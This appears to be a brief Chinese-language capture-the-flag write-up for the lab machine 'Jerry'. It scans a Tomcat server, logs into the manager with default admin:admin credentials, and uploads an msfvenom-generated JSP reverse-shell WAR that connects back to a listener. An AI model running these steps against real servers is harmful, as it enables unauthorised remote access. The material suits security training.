# Jerry

1.  nmap 扫描

    ```shell
    nmap -sT -p- --min-rate 1000 10.10.10.95
    	PORT     STATE SERVICE
    	8080/tcp open  http-proxy

    sudo nmap -sU -p- --min-rate 1000 10.10.10.95
    ```
2. 在这里看到是一个 Tomcat 7.0.88 在这里我们使用 默认登陆凭据试一下 `admin:admin` 登录成功
3. 在跳转 /manger/html 页面中出现了登陆的用户名以及密码，进行登陆就可以看到上传 war 包界面
4.  使用 msfvenom 生成 后门

    ```shell
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war > shell.war
    # 生成后使用下面命令查看文件夹结构
    jar -ft shell.war

    # 启用监听
    nc -nvlp 4444
    ```
5. 在页面进行上传后，访问页面即可就可以获得 shell
